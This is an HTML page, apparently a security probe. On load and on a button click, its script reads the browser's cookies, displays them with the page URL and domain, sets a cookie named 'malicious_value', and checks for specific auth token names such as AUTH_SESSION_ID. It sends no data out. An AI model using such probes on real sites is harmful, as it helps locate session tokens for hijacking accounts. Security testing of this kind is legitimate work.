<!DOCTYPE html>
<html>
<head>
    <title>Simple Cookie Test</title>
    <style>
        body { font-family: Arial; padding: 20px; background: #000; color: #00ff00; }
        .result { border: 2px solid #ff0000; padding: 15px; margin: 10px 0; background: #111; }
        pre { background: #222; color: #fff; padding: 10px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>üç™ Cookie Access Test</h1>
    <button onclick="testCookies()">üöÄ Test Cookie Access</button>
    <div id="results"></div>

    <script>
        function testCookies() {
            const results = document.getElementById('results');
            results.innerHTML = '';
            
            // Test 1: Direct cookie access
            const cookies = document.cookie;
            const div1 = document.createElement('div');
            div1.className = 'result';
            div1.innerHTML = `
                <h3>üç™ Document.cookie Access</h3>
                <p>Length: ${cookies.length}</p>
                <pre>${cookies || 'No cookies accessible'}</pre>
                <p>URL: ${location.href}</p>
                <p>Domain: ${location.hostname}</p>
            `;
            results.appendChild(div1);
            
            // Test 2: Try to set a test cookie
            try {
                document.cookie = "test_cookie=malicious_value; path=/";
                const testRead = document.cookie;
                const div2 = document.createElement('div');
                div2.className = 'result';
                div2.innerHTML = `
                    <h3>üîß Cookie Write Test</h3>
                    <p>After setting test cookie:</p>
                    <pre>${testRead}</pre>
                `;
                results.appendChild(div2);
            } catch (e) {
                const div2 = document.createElement('div');
                div2.className = 'result';
                div2.innerHTML = `<h3>‚ùå Cookie Write Failed</h3><p>${e.message}</p>`;
                results.appendChild(div2);
            }
            
            // Test 3: Check for specific auth tokens in any accessible data
            const authTokens = ['lhtndhgfd', 'arkeyt473rfh7834cd', 'AUTH_SESSION_ID'];
            let foundTokens = [];
            
            authTokens.forEach(token => {
                if (cookies.includes(token)) {
                    foundTokens.push(token);
                }
            });
            
            if (foundTokens.length > 0) {
                const div3 = document.createElement('div');
                div3.className = 'result';
                div3.style.borderColor = '#00ff00';
                div3.innerHTML = `
                    <h3>üö® AUTH TOKENS FOUND!</h3>
                    <p>Found tokens: ${foundTokens.join(', ')}</p>
                `;
                results.appendChild(div3);
            }
            
            console.log('Cookie test completed');
            console.log('Cookies:', cookies);
            console.log('Location:', location.href);
        }
        
        // Auto-run on load
        window.addEventListener('load', function() {
            setTimeout(testCookies, 1000);
        });
    </script>
</body>
</html>
